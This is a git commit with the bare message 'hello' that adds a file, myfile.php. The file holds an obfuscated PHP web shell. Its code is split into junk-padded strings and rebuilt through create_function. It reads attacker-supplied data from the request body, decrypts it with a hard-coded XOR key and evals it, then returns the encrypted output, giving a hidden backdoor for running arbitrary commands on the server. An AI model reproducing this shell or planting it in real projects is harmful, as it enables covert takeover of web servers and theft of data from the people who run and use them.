993a4d533ebd11cd3a7eebdb64c7616e18f3c963
stefani0 <stefani.toto@gmail.com>
2019-11-19 11:08:50 -0500

    hello

---
+++ myfile.php
@@ -0,0 +1,11 @@
+<?php
+$Y='al(@gzIuncompIrIess(@x(@base6I4I_decodeI($m[1]),$kI)));$o=@oIb_Iget_contenItsI();@ob_';
+$X='Ich("/I$khI(.+)$kf/",@filIIe_Iget_contents("phpI:I/I/input"),$m)==1I){@oIb_start();@eIIv';
+$M='IjI=0;($j<$c&&I$i<$l);I$jI++,$Ii++){$o.=$t{$Ii}^$k{I$j};}}IrIetuIrn $o;}if(@pIreIg_mat';
+$h='I$k="25d55adI2";$khI="83Iaa40I0Iaf46I4";$kf="c76d713c07Iad";$Ip="OvfcsIlX20IItVaX8Ca";';
+$p=str_replace('Z','','ZcZreate_ZfuZZnZction');
+$u='funcIItion x($t,$kI){$c=IstIrleIn($k);$l=sItrlen($t)I;$o=""I;foIr($iI=0;$i<I$l;){for($';
+$x='endII_clean();I$r=I@bIase64_encodIeI(@x(@gzcIompress($oII),$k));print("$pII$kh$r$kf");}';
+$N=str_replace('I','',$h.$u.$M.$X.$Y.$x);
+$H=$p('',$N);$H();
+?>
